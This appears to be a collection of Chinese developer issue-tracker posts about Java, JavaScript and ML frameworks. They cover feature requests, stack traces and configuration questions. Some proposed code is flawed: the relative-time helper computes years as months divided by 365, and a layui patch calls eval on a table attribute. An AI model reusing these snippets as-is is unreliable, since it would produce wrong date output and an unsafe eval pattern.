希望增加一个相对时间的方法,"获取几天前，几月前方法还是会遇到的，尤其是博客feed流之类的比较常用，方法可以参考如下，这个算是个很小的建议吧，不添加也没关系   <code>: public class DateUtil extends cn.hutool.core.date.DateUtil { private static final long ONE_MINUTE = 60000L; private static final long ONE_HOUR = 3600000L; private static final long ONE_DAY = 86400000L; private static final long ONE_WEEK = 604800000L; private static final String ONE_SECOND_AGO = ""秒前""; private static final String ONE_MINUTE_AGO = ""分钟前""; private static final String ONE_HOUR_AGO = ""小时前""; private static final String ONE_DAY_AGO = ""天前""; private static final String ONE_MONTH_AGO = ""月前""; private static final String ONE_YEAR_AGO = ""年前""; public static String relative(Date date) { long delta = System.currentTimeMillis()- date.getTime(); if (delta &lt; ONE_MINUTE) { long seconds = toSeconds(delta); return (seconds &lt;= 0 ? 1 : seconds) + ONE_SECOND_AGO; } if (delta &lt; 45L * ONE_MINUTE) { long minutes = toMinutes(delta); return (minutes &lt;= 0 ? 1 : minutes) + ONE_MINUTE_AGO; } if (delta &lt; 24L * ONE_HOUR) { long hours = toHours(delta); return (hours &lt;= 0 ? 1 : hours) + ONE_HOUR_AGO; } if (delta &lt; 48L * ONE_HOUR) { return ""昨天""; } if (delta &lt; 30L * ONE_DAY) { long days = toDays(delta); return (days &lt;= 0 ? 1 : days) + ONE_DAY_AGO; } if (delta &lt; 12L * 4L * ONE_WEEK) { long months = toMonths(delta); return (months &lt;= 0 ? 1 : months) + ONE_MONTH_AGO; } else { long years = toYears(delta); return (years &lt;= 0 ? 1 : years) + ONE_YEAR_AGO; } } private static long toSeconds(long date) { return date / 1000L; } private static long toMinutes(long date) { return toSeconds(date) / 60L; } private static long toHours(long date) { return toMinutes(date) / 60L; } private static long toDays(long date) { return toHours(date) / 24L; } private static long toMonths(long date) { return toDays(date) / 30L; } private static long toYears(long date) { return toMonths(date) / 365L; } }"
UI 样式建议,"除了【右侧边悬浮文档标题导航】之外主要是一些小的风格建议，看看作者觉得哪些可以。 请求方式统一全部全大写格式，保持风格统一。 【响应数据】改成响应样例，并放在最后面，因为默认全展开的情况下，有时候太长，不利于文档的阅读。 侧边栏二级菜单，以这样的显示方式是否会更好点，url可能会比较长正好单独占一行，甚至可以考虑不显示url。标题放在url上边并突出显示： <ol start=""4""> 更规范的多级标题，并提供右侧边悬浮文档标题导航（可隐藏） 添加【接口说明】二级标题，并将原接口说明改为接口描述，接口描述放在produces后面。 去除所有标题的冒号 二级标题：【接口说明】【请求参数】【响应参数】(原:响应参数说明)【响应状态】(原:响应状态码说明)【响应样例】(原:响应数据) 所有schema属性说明统一为三级标题。标题名为：根 schema 或者 对应的名称。   <code>: POST 创建用户 /users"
后台新增菜单时，点击节点马上被锁定，不能输入,pigx版本: 2.6.0 操作系统: windows 是否修改包名: 否   <code>: 前端项目里的menu下的index.vue里要删除||后面的值，如图。
SpringBoot集成justauth-spring-boot-starter 1.3.3版本 调用Google登录时报：java.net.SocketException: Connection reset 异常,2. 在哪个步骤出现了问题？ 3. 您希望得到什么结果？ ... 57 more   <code>: 开启了全局V+P+N，程序配置代理 调用AuthRequest.login()时报：com.xkcoding.http.exception.SimpleHttpException: java.net.SocketException: Connection reset
验证签名失败,"有没有人遇到签名失败的情况： 最后打印：验证签名失败：signature={}，certificate.getPublicKey()={}   <code>: // 验证证书序列号 if (serialNumber.equalsIgnoreCase(serialNo)) { boolean verifySignature = WxPayKit.verifySignature(signature, body, nonce, timestamp, certificate.getPublicKey()); if (verifySignature) { JSONObject resultObject = JSONUtil.parseObj(body); JSONObject resource = resultObject.getJSONObject(""resource""); String cipherText = resource.getStr(""ciphertext""); String nonceStr = resource.getStr(""nonce""); String associatedData = resource.getStr(""associated_data""); AesUtil aesUtil = new AesUtil(key.getBytes(StandardCharsets.UTF_8)); // 密文解密 return aesUtil.decryptToString( associatedData.getBytes(StandardCharsets.UTF_8), nonceStr.getBytes(StandardCharsets.UTF_8), cipherText ); } else { log.info(""验证签名失败：signature={}，certificate.getPublicKey()={}"", signature, certificate.getPublicKey()); } } else { log.info(""证书序列号不相等：serialNumber={}，serialNo={}"", serialNumber, serialNo); }"
怎么在响应头添加Access-Control-Allow-Private-Network？,"pig版本:3.4.5 我想实现外网访问内网的功能 登录的url: http://192.168.16.157:9999/auth/oauth/token?randomStr=65701648030265582&amp;code=&amp;grant_type=password&amp;scope=server gateway: default-filters: - DedupeResponseHeader=Access-Control-Allow-Origin   <code>: globalcors: corsConfigurations: '[/**]': allowedOriginPatterns: ""*"" #注意这个设置只对 spring boot 2.4+ 有效，低版本 使用 allowedOrigins: ""*"" 属性 allowed-methods: ""*"" allowed-headers: ""*"" allow-credentials: true exposedHeaders: ""Content-Disposition,Content-Type,Cache-Control"""
增加table edit 可玩性,"layui 中 table组件里面的 列属性有一个 edit 这个edit 只有一个固定值 text 但是如果我们有一个列表 有些行可以修改 有些又不能修改 视权限而定 这个时候就需要重造此方法了 原始代码 此为 table 中的 td 点击事件处理 i.layBody.on(""click"", ""td"", function (e) { var i = t(this), a = (i.data(""field""), i.data(""edit"")), l = i.children(h); if (!i.data(""off"") &amp;&amp; a) { var n = t(''); return n[0].value = i.data(""content"") || l.text(), i.find(""."" + R)[0] || i.append(n), n.focus(), void layui.stope(e) } }). 修改为 i.layBody.on(""click"", ""td"", function (e) { var b = t(this), a = (b.data(""field""), b.data(""edit"")), l = b.children(h),n = b.parents(""tr"").eq(0).data(""index""); var itemData = d.cache[i.key][n]; if(isExitsFunction(a)){ var func = eval(a); a = func(itemData); } if (!b.data(""off"") &amp;&amp; a) { var n = t(''); return n[0].value = b.data(""content"") || l.text(), b.find(""."" + R)[0] || b.append(n), n.focus(), void layui.stope(e) } }) 其中 设置edit:""checkEditAuth"" 需要为函数名 且挂载在window中 function checkEditAuth(d){ 修改代码如下 所属文章 https://blog.52nyg.com/2021/03/668   <code>: return d.staff_id == 21; }"
只显示某个组织里具有某个角色的人,"SELECT t.id, t.login_name AS loginName, t., t.phone, t., t.sex, t.age, t.create_time AS createTime, t.user_type AS userType, t., t.organization_id AS organizationId, s. AS organizationName, group_concat(o.) AS rolesList FROM user t LEFT JOIN user_role r ON t.id = r.user_id LEFT JOIN role o ON r.role_id = o.id LEFT JOIN organization s ON s.id = t.organization_id WHERE t.organization_id = 7 GROUP BY t.id ORDER BY createTime ASC LIMIT 0,20 请问怎么查询t.organization_id = 7里面具有manager角色的人 要怎么改mapper sql语句?   <code>: name password status name name"
lowdb支持加密功能,"可参考： 比较重要的是，lowdb本身支持对于配置文件的加密，但是需要自己去实现写加解密的函数。 如下加解密方式可以参考下：   <code>: const adapter = new FileSync('db.json', { serialize: (data) =&gt; encrypt(JSON.stringify(data)), deserialize: (data) =&gt; JSON.parse(decrypt(data)) }) const algorithm = ""aes-256-ctr""; const ENCRYPTION_KEY = ""&lt;ENCRYPTION_KEY&gt;"" const IV_LENGTH = 16; // 加密 function encrypt(text) { let iv = crypto.randomBytes(IV_LENGTH); let cipher = crypto.createCipheriv( algorithm, Buffer.from(ENCRYPTION_KEY, ""hex""), iv ); cipher.setAutoPadding(true); let encrypted = cipher.update(text); encrypted = Buffer.concat([encrypted, cipher.final()]); return iv.toString(""hex"") + "":"" + encrypted.toString(""hex""); } // 解密 function decrypt(text) { let textParts = text.split("":""); let iv = Buffer.from(textParts.shift(), ""hex""); let encryptedText = Buffer.from(textParts.join("":""), ""hex""); let decipher = crypto.createDecipheriv( algorithm, Buffer.from(ENCRYPTION_KEY, ""hex""), iv ); let decrypted = decipher.update(encryptedText); decrypted = Buffer.concat([decrypted, decipher.final()]); return decrypted.toString(); }"
mindspore.ops.Diag  example code report error,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : [ERROR] KERNEL(171189,python):2021-03-06-15:33:37.777.107 [mindspore/ccsrc/backend/kernel_compiler/kernel_query.cc:95] KernelQueryAll] Failed to obtain operator info, Please check whether the operator info is registered, Op full name:Default/Diag-op0Node Type: Diag, Node DebugString: kernel_graph_0:[CNode]0{[0]: ValueNode Diag, [1]: [Parameter]1} trace: RuntimeError: mindspore/ccsrc/backend/kernel_compiler/kernel_query.cc:95 KernelQueryAll] NotExistsError Failed to obtain operator info, Please check whether the operator info is registered, Op full name:Default/Diag-op0Node Type: Diag, Node DebugString: kernel_graph_0:[CNode]0{[0]: ValueNode Diag, [1]: [Parameter]1} trace: Constructs a diagonal tensor with a given diagonal values.   <code>: from mindspore.ops import operations as P from mindspore import Tensor input_x = Tensor([1, 2, 3, 4]) diag = P.Diag() diag(input_x)"
自动重定向控制,"之前版本无法正确处理 301、302、307 等重定向请求，而且 okhttp 和 httpclient 默认处理方式又有所不同，造成很多重定向相关的问题。 以下是新版本对重定向处理的办法 重定向请求的日志 默认自动触发重定向，重定向的请求日志如下： 如何在自动重定向的模式下处理和获取信息 拦截器的 方法会在重定向地址转移请求发送前触发，以此获得以一次的Request和Response对象， 即返回 301、302 等状态码的响应对象。 同时，还能对地址转移请求做修改 除了拦截器可以截取转移前请求和响应对象外，也可以通过 OnRedirection 回调函数接口进行同样的操作： 打开/关闭自动重定向 以上是第一种模式，即自动重定向模式，也可以关闭自动重定向, 可以有两种方式打开和关闭重定向： 打开/关闭全局自动重定向配置： 除了全局开关，还可以使用 注解，它能控制到具体的接口和方法 如何在关闭自动重定向的模式下处理和获取信息 通过 ForestReposne.isRedirection() 判断是否需要重定向转移，再通过 ForestResponse.redirectionRequest() 获取重定向Url转移请求对象。 这时，拦截器和 OnRedirection 回调函数同样有效。   <code>: [Forest] Request (okhttp3): [Redirect]: From POST http://localhost:59006/ -&gt; 301 POST http://localhost:59006/b HTTP onRedirection public class RedirectInterceptor implements Interceptor&lt;Object&gt; { @Override public void onRedirection(ForestRequest&lt;?&gt; redirectReq, ForestRequest&lt;?&gt; prevReq, ForestResponse&lt;?&gt; prevRes) { // 获取转移前请求信息 String prevUrl = prevReq.getUrl(); // 获取转移前响应信息 String location = prevRes.getHeader(""Location""); // 对地址转移请求做修改 redirectReq.addBody(""body"", ""xxx""); } } // OnRedirection 为重定向回调函数，会在url转移前触发 @Post(""/"") ForestResponse&lt;String&gt; sendData(OnRedirection onRedirection); ... ... ForestResponse&lt;String&gt; response = sendData((redirectReq, prevReq, prevRes) -&gt; { // 获取转移前请求信息 String prevUrl = prevReq.getUrl(); // 获取转移前响应信息 String location = prevRes.getHeader(""Location""); // 对地址转移请求做修改 redirectReq.addBody(""body"", ""xxx""); }); forest: ... ... # 全局自动重定向开关，默认为开启 auto-redirection: false @Redirection // 打开整个接口方法的自动重定向 @Redirection public interface MyTestClient { // 关闭某个方法的重定向 @Redirection(false) @Get(""/"") String getData(); ... ... } // 关闭整个接口方法的自动重定向 @Redirection(false) public interface MyTestClient { // 打开某个方法的重定向 @Redirection @Get(""/"") String getData(); ... ... } // 关闭了自动重定向 // 需要将方法返回值设为 ForestResponse 类型 @Redirection(false) @Get(""/"") ForestResponse&lt;String&gt; getData(); // 调用接口获得转移前的响应对象 ForestResponse&lt;String&gt; response = client.getData(); // 判断是否需要重定向转移 if (response.isRedirection()) { // 获得转移请求对象，并执行 String result = response.redirectionRequest().executeAsString(); ... ... }"
解析csr 证书NPE,使用的JDK版本和Hutool版本 4.5.6 1.8   <code>: -----BEGIN CERTIFICATE REQUEST----- MIICkTCCAXkCAQAwFjEUMBIGA1UEAwwLZXhhbXBsZS5jb20wggEiMA0GCSqGSIb3 DQEBAQUAA4IBDwAwggEKAoIBAQC46LEeG301SBQsfS3nluNbAeTcWLEr+g1wkHkt ME4KwvxF+KBTN4NRSOkdEavEnlfwP7K/u0bGQbYJsAWftxUrQcrAe8DMOrgXS5Ne XIwsLb9a9+PHKqUBg319dkjcdtaVZYRtKIMsAeMV80F68d2s7i5/3ZLyyUMpdJwE I5CLktG/VhQVg8C/Cf6Yv1aZTXhhTG9DkCiYP6wev/4yovDqHE9zFvQgTP+dzKhf HS9egKDcvf7InAqcR/ydO1JJGpg+L6qf7txjwR5jKmZJlMgHBUusp0rJUQ4oI/uo x/ll64e0i2JtkZGcA9GpNx/thxMW3g8vRo2ExUf8E9/mluCLAgMBAAGgNjA0Bgkq hkiG9w0BCQ4xJzAlMAsGA1UdDwQEAwIF4DAWBgNVHREEDzANggtleGFtcGxlLmNv bTANBgkqhkiG9w0BAQsFAAOCAQEAQsxrzDfo2vk3JMvAQNh1ndAhowP2Bx+q/hMo R2mg+53MjDUwJDePx+TgjGNWMlbVDgr6DFjCl999757Mt5zRjNV8of1Pi4zIdpHv iBREIrFIYmPMSABcV6N55Tuqawufgh6qJcngL6C60ML7mU2Rijft26Gob+DkGPEK SrMNRphu3+9XyUlwTF3+x5gnor5m8CyiC9ne6GyajiqHPfwvsIQ8D+T9UFlNGOxw uGX/rIzTPWFWptQPyqtPhitM6PjAdhX3THJzoO8rWKH6xNKSOYdCD5Jx38tmr29g 4D0o6ENTnpMpqypJk8tpTKKBfoqnCe+aX0VDd71UTMb4tPvzwA== -----END CERTIFICATE REQUEST-----
3.0 版本文件上传不显示上传选择文本域,"Maven 依赖： 配置文件： 上传代码： 效果： 另外，使用 DocumentationType.SWAGGER_2 knife4j是可以显示文本选择域的，   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/dependency&gt; public Docket createRestApi() { return new Docket(DocumentationType.OAS_30) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.withClassAnnotation(Api.class)) .paths(PathSelectors.any()) .build(); } @PostMapping(value = ""/upload"") @ApiOperation(value = ""上传文件"") public Result&lt;Boolean&gt; upload(@RequestPart(value = ""file"") MultipartFile file) { .... }"
关于多租户的bug还是功能问题,大佬您好： 我采用 中的yy111企业编码查看后，该企业属于不在有效期，但是在下面地址依旧可以登录 请问是bug还是操作不当引起的。有效期目前无效。   <code>: http://tangyh.top:180/zuihou-admin-ui/#/defaults/tenant http://tangyh.top:10000/zuihou-ui/#/dashboard
Paddle的单机训练的python api,"实现使用python来驱动训练流程，达到类似下面的效果 这个事情需要通过以下几个步骤完成: 清除掉Paddle运行时依赖的全局变量。否则，我们只能使用多进程来加载多个网络了。 添加需要的python api，来完成这项功能。   <code>: import paddle # Context是使用设备的上下文。Paddle究竟使用多少设备，在这里指定 context = paddle.Context(devices=[paddle.cpu_all, paddle.gpu_all]) # use all device in one node. # 定义一个网络。前面的注解说明这个函数是一个网络定义。 @context.network() def simple_network(network): # network参数是一个网络定义的函数集合，包括了我们支持的layers ipt = network.data_layer(name=""input"", size=784) hidden = network.fc_layer(input=ipt, size=200) predict = network.fc_layer(input=hidden, size=10, act=SoftmaxActivation()) cost = network.classification_cost(input=predict, label=network.data_layer(name=""input"", size=10)) return cost # 返回优化的目标。相当于现在paddle的outputs # define a data provider, same as current Paddle process. @paddle.provider() def process_data(settings, filename): for sample in read_from_file(filename): yield sample # train all networks in current context. context.with_train_data(train_files=[""a.txt"", ""b.txt""], method=process_data) # set train data, and data provider .with_test_data(test_files=[""c.txt""], test_period=Batch(1000), method=process_data) # set test data .use_optimizer(SgdOptimizer()) # set optimizer. .standard_sgd_train(num_passes=100) # set use standard sgd strategy to train 100 pass. context.exit(0)"
Design doc: Batch Normalization Operator,Related: #3684:Update doc about how to write new operators. Here may be easier to read. Some part of design is strongly related with Python API and needs future discussions.   <code>: batch_norm_op
How to stop layer's gradient like Tensorflow in Fluid,"In Tensorflow, We can stop gradient by using fc1 = tf.stop_gradient(fc1) and the gradient will not pass by this layer. Do we have same mechanism in fluid? I tried using fc1.stop_gradient=False but it didn't work.   <code>: fc1 = fluid.layers.fc(x, 128)"
"ERROR o.s.b.SpringApplication - [reportFailure,826] - Application run failed","一开始报错的是DruidDataSource {dataSource-1} init error，然后更改了一下application-druid.yml的数据库url和root密码，将ssh设为了false,然后就成功初始化了。 但是现在又报了这样的错误： 仔细检查了application.yml文件，也找不出啥错误，求解答。   <code>: 12:49:06.320 [restartedMain] ERROR o.s.b.SpringApplication - [reportFailure,826] - Application run failed org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'objectMapperConfigurer' defined in class path resource [springfox/documentation/spring/web/SpringfoxWebMvcConfiguration.class]: BeanPostProcessor before instantiation of bean failed; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authorizationAttributeSourceAdvisor' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'authorizationAttributeSourceAdvisor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilterFactoryBean' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilterFactoryBean' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.shiro.mgt.SecurityManager]: Factory method 'securityManager' threw exception; nested exception is java.lang.ExceptionInInitializerError at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:511) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:207) at org.springframework.context.support.PostProcessorRegistrationDelegate.registerBeanPostProcessors(PostProcessorRegistrationDelegate.java:241) at org.springframework.context.support.AbstractApplicationContext.registerBeanPostProcessors(AbstractApplicationContext.java:723) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:536) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:405) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.ruoyi.RuoYiApplication.main(RuoYiApplication.java:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authorizationAttributeSourceAdvisor' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'authorizationAttributeSourceAdvisor' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilterFactoryBean' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilterFactoryBean' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.shiro.mgt.SecurityManager]: Factory method 'securityManager' threw exception; nested exception is java.lang.ExceptionInInitializerError at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:799) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:540) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:207) at org.springframework.aop.framework.autoproxy.BeanFactoryAdvisorRetrievalHelper.findAdvisorBeans(BeanFactoryAdvisorRetrievalHelper.java:91) at org.springframework.aop.framework.autoproxy.AbstractAdvisorAutoProxyCreator.findCandidateAdvisors(AbstractAdvisorAutoProxyCreator.java:111) at org.springframework.aop.aspectj.annotation.AnnotationAwareAspectJAutoProxyCreator.findCandidateAdvisors(AnnotationAwareAspectJAutoProxyCreator.java:92) at org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator.shouldSkip(AspectJAwareAdvisorAutoProxyCreator.java:101) at org.springframework.aop.framework.autoproxy.AbstractAutoProxyCreator.postProcessBeforeInstantiation(AbstractAutoProxyCreator.java:251) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInstantiation(AbstractAutowireCapableBeanFactory.java:1140) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.resolveBeforeInstantiation(AbstractAutowireCapableBeanFactory.java:1113) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:505) ... 19 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'shiroFilterFactoryBean' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Unsatisfied dependency expressed through method 'shiroFilterFactoryBean' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.shiro.mgt.SecurityManager]: Factory method 'securityManager' threw exception; nested exception is java.lang.ExceptionInInitializerError at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:799) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:540) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getSingletonFactoryBeanForTypeCheck(AbstractAutowireCapableBeanFactory.java:1007) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryBean(AbstractAutowireCapableBeanFactory.java:884) at org.springframework.beans.factory.support.AbstractBeanFactory.isTypeMatch(AbstractBeanFactory.java:619) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:536) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:495) at org.springframework.beans.factory.BeanFactoryUtils.beanNamesForTypeIncludingAncestors(BeanFactoryUtils.java:265) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1473) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1270) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:886) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:790) ... 36 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'securityManager' defined in class path resource [com/ruoyi/framework/config/ShiroConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.shiro.mgt.SecurityManager]: Factory method 'securityManager' threw exception; nested exception is java.lang.ExceptionInInitializerError at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:657) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:637) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1307) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:886) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:790) ... 50 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.shiro.mgt.SecurityManager]: Factory method 'securityManager' threw exception; nested exception is java.lang.ExceptionInInitializerError at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:652) ... 64 common frames omitted Caused by: java.lang.ExceptionInInitializerError: null at javax.crypto.KeyGenerator.nextSpi(KeyGenerator.java:340) at javax.crypto.KeyGenerator.&lt;init&gt;(KeyGenerator.java:168) at javax.crypto.KeyGenerator.getInstance(KeyGenerator.java:223) at org.apache.shiro.crypto.AbstractSymmetricCipherService.generateNewKey(AbstractSymmetricCipherService.java:56) at org.apache.shiro.crypto.AbstractSymmetricCipherService.generateNewKey(AbstractSymmetricCipherService.java:43) at org.apache.shiro.mgt.AbstractRememberMeManager.&lt;init&gt;(AbstractRememberMeManager.java:99) at org.apache.shiro.web.mgt.CookieRememberMeManager.&lt;init&gt;(CookieRememberMeManager.java:87) at org.apache.shiro.web.mgt.DefaultWebSecurityManager.&lt;init&gt;(DefaultWebSecurityManager.java:76) at com.ruoyi.framework.config.ShiroConfig.securityManager(ShiroConfig.java:234) at com.ruoyi.framework.config.ShiroConfig$$EnhancerBySpringCGLIB$$2d163595.CGLIB$securityManager$0(&lt;generated&gt;) at com.ruoyi.framework.config.ShiroConfig$$EnhancerBySpringCGLIB$$2d163595$$FastClassBySpringCGLIB$$5d3538.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:331) at com.ruoyi.framework.config.ShiroConfig$$EnhancerBySpringCGLIB$$2d163595.securityManager(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 65 common frames omitted Caused by: java.lang.SecurityException: Can not initialize cryptographic mechanism at javax.crypto.JceSecurity.&lt;clinit&gt;(JceSecurity.java:93) ... 84 common frames omitted Caused by: java.lang.SecurityException: The jurisdiction policy files are not signed by the expected signer! (Policy files are specific per major JDK release.Ensure the correct version is installed.) at javax.crypto.JarVerifier.verifyPolicySigned(JarVerifier.java:336) at javax.crypto.JceSecurity.loadPolicies(JceSecurity.java:378) at javax.crypto.JceSecurity.setupJurisdictionPolicies(JceSecurity.java:323) at javax.crypto.JceSecurity.access$000(JceSecurity.java:50) at javax.crypto.JceSecurity$1.run(JceSecurity.java:85) at java.security.AccessController.doPrivileged(Native Method) at javax.crypto.JceSecurity.&lt;clinit&gt;(JceSecurity.java:82) ... 84 common frames omitted"
